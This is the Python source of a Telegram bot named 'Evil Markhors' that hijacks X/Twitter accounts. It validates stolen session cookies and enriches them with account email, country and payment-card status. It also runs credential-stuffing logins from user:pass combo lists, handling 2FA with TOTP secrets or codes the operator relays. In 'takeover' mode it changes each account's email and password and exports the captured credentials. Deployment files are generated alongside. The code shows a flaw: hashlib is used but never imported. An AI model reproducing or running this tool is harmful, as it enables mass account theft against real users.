#!/usr/bin/env python3
"""
Evil Markhors Bot - ALL-IN-ONE (cookies + ULP)
Interactive code: X jab code maange, bot aapko batata hai; aap code bhejte ho, bot aage badhta hai.
"""
import os, re, sys, json, stat, hmac, time, base64, struct, secrets, string
import asyncio, logging, tempfile, zipfile

try:
    import httpx
    from telegram import Update, InputFile
    from telegram.ext import (ApplicationBuilder, CommandHandler,
                              MessageHandler, filters, ContextTypes)
except ImportError:
    print("Deps missing: pip install -r requirements.txt"); raise

# ============================ CONFIG ============================
BOT_TOKEN    = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE      = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT       = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
CONCURRENCY  = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT      = float(os.getenv("TIMEOUT", "25"))
MAX_FILES    = int(os.getenv("MAX_FILES", "5000"))
RETRIES      = int(os.getenv("RETRIES", "3"))
STORE_PATH   = os.getenv("STORE_PATH", "users.json")
HERE         = os.path.dirname(os.path.abspath(__file__))
SELF         = os.path.basename(os.path.abspath(__file__))

BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
          "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

FIELDS = ["Username","ID","Followers","Friends","Posts","Likes","Media","Verified",
          "Verified type","Suspended","Protected","Country","Year","Created","Email",
          "Phone","2FA","Card added","API","Developer API"]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

# ============================ DEPLOY TEMPLATES ============================
FILES = {
 "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
 ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\n",
 ".env.example": ("BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
                  "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\nSTORE_PATH=users.json\n"),
 "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\nENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
                f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"),
 "docker-compose.yml": ("services:\n  bot:\n    build: .\n    restart: unless-stopped\n    environment:\n"
                        "      - BOT_TOKEN=${BOT_TOKEN}\n      - LIVE=1\n      - STORE_PATH=/data/users.json\n"
                        "    volumes:\n      - ./data:/data\n"),
 "evilmarkhors-bot.service": ("[Unit]\nDescription=Evil Markhors Bot\nAfter=network-online.target\n\n[Service]\n"
                              "Type=simple\nUser=botuser\n" f"WorkingDirectory={HERE}\nEnvironmentFile={HERE}/.env\n"
                              f"ExecStart={HERE}/venv/bin/python {HERE}/{SELF}\n"
                              "Restart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n"),
 "push.sh": "#!/usr/bin/env bash\nset -e\ngit add -A\ngit commit -m \"update $(date +%F_%H:%M)\" || true\ngit push\n",
 "deploy.sh": (f"#!/usr/bin/env bash\nset -e\ncd {HERE}\ngit pull --rebase\n"
               "venv/bin/pip install -q -r requirements.txt\nsudo systemctl restart evilmarkhors-bot\n"),
 "README.md": f"# Evil Markhors Bot\n\nCookie + ULP reworker.\n\n```\npython3 -m venv venv && venv/bin/pip install -r requirements.txt\ncp .env.example .env\npython {SELF}\n```\n",
}

def _w(p, c, ov=False):
    f = os.path.join(HERE, p)
    if os.path.exists(f) and not ov: return False
    with open(f, "w", encoding="utf-8") as fh: fh.write(c)
    if p.endswith(".sh"): os.chmod(f, os.stat(f).st_mode | stat.S_IEXEC)
    return True

def bootstrap(force=False):
    return [n for n, c in FILES.items() if _w(n, c, force)]

# ============================ STATE ============================
_store, _lock = {}, asyncio.Lock()
BATCH = {}     # uid -> batch
PEND  = {}     # uid -> {key: state}

def load_store():
    global _store
    try:
        with open(os.path.join(HERE, STORE_PATH), encoding="utf-8") as f: _store = json.load(f)
    except Exception: _store = {}

def save_store():
    try:
        p = os.path.join(HERE, STORE_PATH)
        with open(p + ".tmp", "w", encoding="utf-8") as f: json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception: logging.exception("store")

def ucfg(uid):
    return _store.setdefault(str(uid), {"live": LIVE_DEFAULT, "mode": "auto",
                                        "takeover": False, "newpass": "", "newemail": ""})

def get_live(uid): return bool(ucfg(uid).get("live", LIVE_DEFAULT))

async def set_cfg(uid, **kw):
    async with _lock:
        ucfg(uid).update(kw); save_store()

# ============================ COOKIE MODE ============================
def parse_cookie_file(text):
    data, cookies = {}, []
    for line in text.splitlines():
        m = _FIELD_RE.match(line)
        if m: data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line and not line.lstrip().startswith("#"): cookies.append(line)
    return data, cookies

def cookie_dict(lines):
    d = {}
    for l in lines:
        p = l.split("\t")
        if len(p) >= 7: d[p[5]] = p[6]
    return d

def build_cookie_file(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append(f"\u2013 {f}: {v if v not in (None, '') else '\u2013'}")
    out.append(f"\u2013 Cookies: {CREDIT}"); out.append(""); out.extend(cookies)
    return "\n".join(out).rstrip() + "\n"

def hdrs(ck):
    return {"Authorization": f"Bearer {BEARER}", "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session" if ck.get("auth_token") else "",
            "x-twitter-client-language": "en", "User-Agent": UA, "Accept": "application/json"}

async def get_json(client, ck, url):
    d = 1.0
    for _ in range(RETRIES):
        try:
            r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
            if r.status_code in (429,500,502,503): await asyncio.sleep(d); d*=2; continue
            return r.json() if r.status_code == 200 else None
        except Exception: await asyncio.sleep(d); d*=2
    return None

def _yr(s):
    m = re.search(r"(19|20)\d{2}", s or ""); return m.group(0) if m else ""

async def live_check(client, ck):
    d = {}
    j = await get_json(client, ck, "https://api.x.com/1.1/account/verify_credentials.json"
        "?include_entities=false&skip_status=true&include_email=true")
    if j:
        d.update({"Username": j.get("screen_name",""), "ID": j.get("id_str",""),
                  "Followers": j.get("followers_count",""), "Friends": j.get("friends_count",""),
                  "Posts": j.get("statuses_count",""), "Likes": j.get("favourites_count",""),
                  "Media": j.get("media_count",""), "Verified": str(bool(j.get("verified"))).lower(),
                  "Verified type": j.get("verified_type") or "", "Suspended": "false",
                  "Protected": str(bool(j.get("protected"))).lower(), "Email": j.get("email","")})
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            if _yr(j["created_at"]): d["Year"] = _yr(j["created_at"])
    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
    if s and s.get("country_code"): d["Country"] = s["country_code"]
    pm = await get_json(client, ck, "https://api.x.com/1.1/account/payment_methods.json")
    if isinstance(pm, dict) and "cards" in pm: d["Card added"] = "Yes" if pm.get("cards") else "No"
    fs = await get_json(client, ck, "https://api.x.com/1.1/account/feature_switches.json")
    if isinstance(fs, dict):
        if "has_api_access" in fs: d["API"] = str(bool(fs["has_api_access"])).lower()
        if "developer_api" in fs: d["Developer API"] = str(bool(fs["developer_api"])).lower()
    return d

async def rework_cookie(text, client, live, sem):
    data, cookies = parse_cookie_file(text)
    if live and cookies:
        async with sem:
            ld = await live_check(client, cookie_dict(cookies))
        for k, v in ld.items():
            if v not in ("", None): data[k] = str(v)
    data["Cookies"] = CREDIT
    return build_cookie_file(data, cookies)

# ============================ ULP MODULE ============================
ONB = "https://api.twitter.com/1.1/onboarding/task.json"

def totp_now(sec):
    sec = sec.strip().replace(" ", "").upper()
    key = base64.b32decode(sec + "=" * ((8 - len(sec) % 8) % 8))
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[19] & 15
    return f"{(struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000:06d}"

def parse_ulp(line):
    parts = [p.strip() for p in line.strip().split(":") if p.strip()]
    if not parts: return None
    email = next((p for p in parts if "@" in p), "")
    totp = ""
    for p in list(parts):
        if p != email and re.fullmatch(r"[A-Z2-7]{16,32}", p): totp = p; parts.remove(p); break
    rest = [p for p in parts if p != email]
    if len(rest) >= 2: username, password = rest[0], rest[1]
    elif len(rest) == 1: username, password = "", rest[0]
    else: return None
    if not password: return None
    return {"username": username, "email": email, "password": password, "totp": totp}

def gen_pass():
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(13)) + "!x7"

def alias_email(base, username):
    local, _, domain = base.partition("@")
    return f"{local}+{username or 'x'}@{domain}" if domain else base

def _H(cl):
    return {"authorization": f"Bearer {BEARER}", "content-type": "application/json",
            "user-agent": UA, "x-twitter-active-user": "yes", "x-twitter-client-language": "en",
            "x-csrf-token": cl.cookies.get("ct0", ""),
            "x-guest-token": cl.cookies.get("guest_token", ""),
            "x-twitter-auth-type": "OAuth2Client" if cl.cookies.get("auth_token") else ""}

async def _task(cl, payload, start=False):
    r = await cl.post(ONB, params={"flow_name": "login"} if start else None,
                      json=payload, headers=_H(cl), timeout=TIMEOUT)
    try: return r.json()
    except Exception: return {}

async def _send(cl, ft, subtask, field, value):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": subtask, field: {"text": value, "link": "next_link"}}]})

async def _duplication(cl, ft):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": "AccountDuplicationCheck",
         "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}]})

def _logged_in(cl): return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))

async def ulp_login(ulp):
    """(client, ok, info). info: {} | {'pending':subtask,'flow_token':ft}."""
    cl = httpx.AsyncClient(follow_redirects=True)
    try:
        r = await cl.post("https://api.twitter.com/1.1/guest/activate.json", headers=_H(cl), timeout=TIMEOUT)
        cl.cookies.set("guest_token", r.json().get("guest_token", ""))
        j = await _task(cl, {"input_flow_data": {"flow_context": {"debug_overrides": {},
              "start_location": {"location": "splash_screen"}}}, "subtask_versions": {}}, start=True)
        ft = j.get("flow_token")
        if not ft: return cl, False, {}
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginJsInstrumentationSubtask",
              "js_instrumentation": {"response": "{}", "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginEnterUserIdentifierSSO",
              "settings_list": {"setting_responses": [{"key": "user_identifier",
              "response_data": {"text_data": {"result": ulp["username"] or ulp["email"]}}}],
              "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginEnterPassword",
              "enter_password": {"password": ulp["password"], "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", "enter_text", totp_now(ulp["totp"]))
            ft = j.get("flow_token", ft)
            subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        for s in subs:
            if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
                return cl, False, {"pending": s, "flow_token": ft}
        if "AccountDuplicationCheck" in subs: j = await _duplication(cl, ft)
        return cl, _logged_in(cl), {}
    except Exception:
        logging.exception("ulp_login"); return cl, False, {}

async def resume_login(st, code):
    cl, ft = st["client"], st["flow_token"]
    j = await _send(cl, ft, st["subtask"], "enter_text", code)
    ft = j.get("flow_token", ft)
    subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
    for s in subs:
        if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
            st["subtask"], st["flow_token"] = s, ft; return "more"
    if "AccountDuplicationCheck" in subs: j = await _duplication(cl, ft)
    return "ok" if _logged_in(cl) else "fail"

EMAIL_SET = ["https://x.com/i/api/1.1/account/update_email.json",
             "https://api.x.com/1.1/account/update_email.json",
             "https://x.com/i/api/1.1/account/settings.json"]
EMAIL_CFM = ["https://x.com/i/api/1.1/account/confirm_email.json",
             "https://api.x.com/1.1/account/confirm_email.json",
             "https://x.com/i/api/1.1/account/verify_email.json"]

async def set_email(cl, ck, new_email):
    for url in EMAIL_SET:
        try:
            r = await cl.post(url, headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"},
                              cookies=ck, data={"email": new_email}, timeout=TIMEOUT)
            if r.status_code == 200: return True
        except Exception: pass
    return False

async def confirm_email(cl, ck, code):
    for url in EMAIL_CFM:
        for field in ("confirmation_code", "code", "email"):
            try:
                r = await cl.post(url, headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"},
                                  cookies=ck, data={field: code}, timeout=TIMEOUT)
                if r.status_code == 200: return True
            except Exception: pass
    return False

async def change_pass(cl, ck, old, new):
    try:
        r = await cl.post("https://twitter.com/i/api/i/account/change_password.json",
            headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"}, cookies=ck,
            data={"current_password": old, "password": new, "password_confirmation": new}, timeout=TIMEOUT)
        return r.status_code == 200
    except Exception: return False

async def finish_account(uid, idx, ulp, cl):
    b = BATCH[uid]; ck = dict(cl.cookies)
    det = await live_check(cl, ck)
    res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
    if b["takeover"] and b["newemail"]:
        ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
        if await set_email(cl, ck, ne):
            res["new_email"] = ne
            res["_cl"], res["_ulp"], res["_idx"] = cl, ulp, idx
            PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
                "ulp": ulp, "idx": idx, "new_email": ne}
            b["results"][idx] = res
            return "email_pending"
    if b["takeover"]:
        np = b["newpass"] or gen_pass()
        if await change_pass(cl, ck, ulp["password"], np): res["new_pass"] = np
    b["results"][idx] = res; b["ok"] += 1
    await cl.aclose(); return "done"

def fmt_result(r):
    if not r: return ""
    if not r.get("ok"):
        return f"== FAIL ==\n{r.get('line','')}\nError: {r.get('err','')}\n"
    u, d = r["ulp"], r["details"]
    o = ["Login: OK", f"Username: {d.get('Username','')}", f"ID: {d.get('ID','')}",
         f"Email: {d.get('Email','') or u.get('email','')}", f"Password: {u['password']}",
         f"2FA: {u.get('totp','') or '\u2013'}"]
    if r.get("new_pass"): o.append(f"New password: {r['new_pass']}")
    if r.get("new_email"): o.append(f"New email: {r['new_email']}")
    if r.get("pending"): o.append(f"STATUS: {r['pending']}")
    for k in ("Followers","Friends","Posts","Likes","Media","Verified","Verified type",
              "Suspended","Protected","Country","Year","Created","Phone","Card added","API","Developer API"):
        o.append(f"{k}: {d.get(k,'') or '\u2013'}")
    return "\n".join(o + [CREDIT, WEBSITE, ""])

# ============================ BATCH RUNNERS ============================
async def process_cookie_zip(ip, op, live, progress):
    ok = fail = 0; sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
            total = len(names)
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
                for i, name in enumerate(names, 1):
                    raw = b""
                    try:
                        raw = zin.read(name)
                        zout.writestr(name, await rework_cookie(raw.decode("utf-8","ignore"), client, live, sem)); ok += 1
                    except Exception:
                        logging.exception("cookie %s", name)
                        try: zout.writestr(name, raw)
                        except Exception: pass
                        fail += 1
                    await progress(i, total, ok, fail)
    return ok, fail, total

async def run_ulp_batch(uid, lines, cfg, progress):
    b = BATCH[uid]; b["lines"] = lines; b["results"] = [None] * len(lines)
    sem = asyncio.Semaphore(CONCURRENCY); lock = asyncio.Lock()
    async def one(idx, line):
        ulp = parse_ulp(line)
        if not ulp:
            b["results"][idx] = {"ok": False, "line": line, "err": "parse"}; b["fail"] += 1
            await progress(); return
        try:
            cl, ok, info = await ulp_login(ulp)
            if info.get("pending"):
                PEND.setdefault(uid, {})[str(idx)] = {"kind": "login", "client": cl,
                    "flow_token": info["flow_token"], "subtask": info["pending"], "ulp": ulp, "idx": idx}
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "pending": info["pending"]}
            elif not ok:
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "err": "login_failed"}; b["fail"] += 1
                await cl.aclose()
            else:
                async with sem:
                    if await finish_account(uid, idx, ulp, cl) == "done": pass
                    else: b["pending_email"] = True
                    if not b["results"][idx].get("pending"): b["ok"] += 1
        except Exception:
            logging.exception("ulp"); b["results"][idx] = {"ok": False, "line": line, "err": "exception"}; b["fail"] += 1
        await progress()
    await asyncio.gather(*(one(i, l) for i, l in enumerate(lines)))

def build_zip(path, uid):
    b = BATCH[uid]
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("results.txt", "\n".join(fmt_result(r) for r in b["results"] if r))
        succ = [r for r in b["results"] if r and r.get("ok")]
        z.writestr("success.txt", "\n".join(
            f"{r['details'].get('Username','')}:{r['details'].get('Email','') or r['ulp'].get('email','')}"
            f":{r.get('new_pass') or r['ulp']['password']}" for r in succ))
        z.writestr("failed.txt", "\n".join((r.get("line") or "") for r in b["results"] if r and not r.get("ok")))

# ============================ HANDLERS ============================
async def _edit(m, t):
    try: await m.edit_text(t)
    except Exception: pass

async def start(u, c):
    await u.message.reply_text(
        "Evil Markhors Bot\n\nTWO MODES (alag alag):\n"
        "1) COOKIES: cookie file -> rework\n"
        "2) ULP: user:pass file -> login verify + takeover\n\n"
        "Commands:\n/mode auto|cookies|ulp\n/live on|off\n/takeover on|off\n"
        "/newpass <pass>\n/newemail you@gmail.com\n/status\n/finalize\n/cancel\n\n"
        "Code maange to bot khud batayega — aap code bhej dena.")

async def help_cmd(u, c):
    await u.message.reply_text(
        "ULP formats: user:pass | email:pass | user:email:pass | ...:2fa\n"
        "Takeover: /takeover on (+ optional /newemail)\n"
        "Code aane par: `username code` bhejo (ek se zyada ho to har line alag).")

async def status_cmd(u, c):
    g = ucfg(u.effective_user.id); b = BATCH.get(u.effective_user.id)
    pend = len(PEND.get(u.effective_user.id, {}))
    await u.message.reply_text(
        f"Mode: {g['mode']}\nLive: {'ON' if g['live'] else 'OFF'}\nTakeover: {'ON' if g['takeover'] else 'OFF'}\n"
        f"NewPass: {g['newpass'] or '(random)'}\nNewEmail: {g['newemail'] or '(none)'}\n"
        f"Batch: {'chal raha' if b else 'none'} | Pending codes: {pend}")

async def mode_cmd(u, c):
    a = (c.args[0].lower() if c.args else "auto"); a = a if a in ("auto","cookies","ulp") else "auto"
    await set_cfg(u.effective_user.id, mode=a); await u.message.reply_text(f"Mode = {a}")

async def live_cmd(u, c):
    uid = u.effective_user.id; a = (c.args[0].lower() if c.args else "")
    new = True if a in ("on","1","yes") else False if a in ("off","0","no") else (not get_live(uid))
    await set_cfg(uid, live=new); await u.message.reply_text(f"Live = {'ON' if new else 'OFF'}")

async def takeover_cmd(u, c):
    uid = u.effective_user.id; a = (c.args[0].lower() if c.args else "")
    new = True if a in ("on","1","yes") else False if a in ("off","0","no") else (not ucfg(uid)["takeover"])
    await set_cfg(uid, takeover=new); await u.message.reply_text(f"Takeover = {'ON' if new else 'OFF'}")

async def newpass_cmd(u, c):
    await set_cfg(u.effective_user.id, newpass=" ".join(c.args) if c.args else "")
    await u.message.reply_text(f"NewPass = {ucfg(u.effective_user.id)['newpass'] or '(random)'}")

async def newemail_cmd(u, c):
    await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
    await u.message.reply_text(f"NewEmail = {ucfg(u.effective_user.id)['newemail'] or '(none)'}")

def detect_mode(text, forced):
    if forced in ("cookies","ulp"): return forced
    return "cookies" if sum(1 for l in text.splitlines() if len(l.split("\t")) >= 7) >= 3 else "ulp"

async def handle_file(u, c, doc):
    uid = u.effective_user.id; g = ucfg(uid)
    if uid in BATCH:
        await u.message.reply_text("Pehle wala batch chal raha hai. /finalize ya /cancel karo."); return
    name = (doc.file_name or "").lower(); is_zip = name.endswith(".zip")
    msg = await u.message.reply_text("Download...")
    tmp = tempfile.mkdtemp(prefix="em_")
    ip = os.path.join(tmp, "in" + (".zip" if is_zip else ".txt"))
    last = [0.0]; loop = asyncio.get_event_loop(); cnt = [0, 0, 0]
    async def prog():
        cnt[2] += 1
        if loop.time() - last[0] < 2 and cnt[2] != cnt[0] + cnt[1]: return
        last[0] = loop.time()
        await _edit(msg, f"{cnt[2]} done | ok {cnt[0]} | pending {cnt[1]}")
    try:
        await (await doc.get_file()).download_to_drive(ip)
        if is_zip:
            with zipfile.ZipFile(ip) as z:
                sample = "".join(z.read(n).decode("utf-8","ignore") for n in z.namelist()[:3] if n.endswith(".txt"))
        else:
            with open(ip, encoding="utf-8") as f: sample = f.read()
        mode = detect_mode(sample, g["mode"])
        await _edit(msg, f"Mode: {mode} | processing...")
        BATCH[uid] = {"tmp": tmp, "mode": mode, "takeover": g["takeover"],
                      "newpass": g["newpass"], "newemail": g["newemail"],
                      "results": [], "lines": [], "ok": 0, "fail": 0, "msg": msg}
        if mode == "cookies":
            op = os.path.join(tmp, "out.zip")
            if not is_zip:
                with zipfile.ZipFile(op, "w") as z: z.write(ip, "reworked.txt")
                ok, fail, total = 1, 0, 1
            else:
                async def p(i, t, o, f): cnt[0], cnt[1] = o, f; await prog()
                ok, fail, total = await process_cookie_zip(ip, op, g["live"], p)
            await u.message.reply_document(InputFile(op, filename="evilmarkhors_cookies.zip"),
                caption=f"Mode: cookies\nDone: {ok} ok, {fail} fail\n{WEBSITE}\n{CREDIT}")
            await _edit(msg, "Complete."); del BATCH[uid]
        else:
            if is_zip:
                with zipfile.ZipFile(ip) as z:
                    lines = []
                    for n in z.namelist():
                        if n.lower().endswith(".txt"):
                            lines += [l for l in z.read(n).decode("utf-8","ignore").splitlines() if l.strip()]
            else:
                with open(ip, encoding="utf-8") as f:
                    lines = [l for l in f.read().splitlines() if l.strip()]
            if not lines:
                await _edit(msg, "Koi line nahi mili."); del BATCH[uid]; return
            await run_ulp_batch(uid, lines, g, prog)
            await after_batch(uid, u, msg)
    except Exception as e:
        logging.exception("handle_file"); await _edit(msg, f"Error: {e}")
        if uid in BATCH and not PEND.get(uid): del BATCH[uid]

async def after_batch(uid, u, msg):
    b = BATCH[uid]; pend = PEND.get(uid, {})
    if pend:
        lst = "\n".join(f"{b['lines'][int(k)].split(':')[0]}  -> {v['kind']}" for k, v in pend.items())
        await _edit(msg, f"{b['ok']} ok | {b['fail']} fail | {len(pend)} code pending")
        await u.message.reply_text(
            f"{len(pend)} account(s) ko code chahiye:\n\n{lst}\n\n"
            "Bhejo format: `username code` (har line alag).\nSab ke baad /finalize.")
    else:
        await finalize_batch(uid, u)

async def finalize_batch(uid, u):
    b = BATCH.get(uid)
    if not b: await u.message.reply_text("Koi batch nahi."); return
    op = os.path.join(b["tmp"], "out.zip")
    build_zip(op, uid)
    succ = sum(1 for r in b["results"] if r and r.get("ok"))
    pend = len(PEND.get(uid, {}))
    await u.message.reply_document(InputFile(op, filename="evilmarkhors_ulp.zip"),
        caption=f"ULP done | ok {succ} | fail {b['fail']} | pending {pend}\n{WEBSITE}\n{CREDIT}")
    await _edit(b["msg"], "Complete.")
    for v in PEND.get(uid, {}).values():
        try: await v["client"].aclose()
        except Exception: pass
    PEND.pop(uid, None)
    try: import shutil; shutil.rmtree(b["tmp"], ignore_errors=True)
    except Exception: pass
    del BATCH[uid]

async def on_text(u, c):
    uid = u.effective_user.id
    if uid not in BATCH or not PEND.get(uid):
        return
    b = BATCH[uid]; pend = PEND[uid]
    byname = {b["lines"][int(k)].split(":")[0].strip().lower(): k for k in pend}
    pairs = []
    for line in u.message.text.splitlines():
        line = line.strip()
        if not line: continue
        parts = line.split()
        if len(parts) >= 2 and parts[0].strip().lower() in byname:
            pairs.append((byname[parts[0].strip().lower()], parts[-1]))
        elif len(pend) == 1:
            pairs.append((list(pend.keys())[0], parts[-1]))
    if not pairs:
        await u.message.reply_text("Samajh nahi aaya. Format: `username code`"); return
    done = 0
    for key, code in pairs:
        st = pend.get(key)
        if not st: continue
        if st["kind"] == "login":
            r = await resume_login(st, code)
            if r == "more":
                await u.message.reply_text(f"{st['ulp']['username'] or st['ulp']['email']}: ek aur code chahiye.")
                continue
            if r == "ok":
                async with asyncio.Lock():
                    res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
                if res != "email_pending":
                    b["ok"] += 1
                del pend[key]; done += 1
                if res == "email_pending":
                    await u.message.reply_text(
                        f"{st['ulp']['username'] or st['ulp']['email']}: email set, confirmation code bhejo.")
            else:
                b["results"][st["idx"]] = {"ok": False, "line": b["lines"][st["idx"]], "err": "code_failed"}
                b["fail"] += 1; del pend[key]; done += 1
        elif st["kind"] == "email":
            ck = dict(st["client"].cookies)
            if await confirm_email(st["client"], ck, code):
                res = b["results"][st["idx"]]
                if b["takeover"]:
                    np = b["newpass"] or gen_pass()
                    if await change_pass(st["client"], ck, st["ulp"]["password"], np): res["new_pass"] = np
                b["ok"] += 1; del pend[key]; done += 1
                await st["client"].aclose()
            else:
                await u.message.reply_text(f"{st['ulp'].get('email','')}: email code galat, dobara bhejo.")
    if not pend:
        await u.message.reply_text("Sab code mil gaye. Finalize ho raha hai...")
        await finalize_batch(uid, u)
    else:
        await u.message.reply_text(f"{done} update | {len(pend)} abhi bhi pending. Baaki codes bhejo ya /finalize.")

async def finalize_cmd(u, c): await finalize_batch(u.effective_user.id, u)

async def cancel_cmd(u, c):
    uid = u.effective_user.id
    for v in PEND.get(uid, {}).values():
        try: await v["client"].aclose()
        except Exception: pass
    PEND.pop(uid, None)
    b = BATCH.pop(uid, None)
    if b:
        try:
            import shutil; shutil.rmtree(b["tmp"], ignore_errors=True)
        except Exception: pass
    await u.message.reply_text("Cancel ho gaya.")

# ============================ MAIN ============================
def main():
    made = bootstrap()
    if made: print("Bani files:", ", ".join(made))
    if "--init" in sys.argv: return
    load_store()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    for cmd, fn in [("start",start),("help",help_cmd),("status",status_cmd),("mode",mode_cmd),
                    ("live",live_cmd),("takeover",takeover_cmd),("newpass",newpass_cmd),
                    ("newemail",newemail_cmd),("finalize",finalize_cmd),("cancel",cancel_cmd)]:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    logging.info("Bot chalu")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
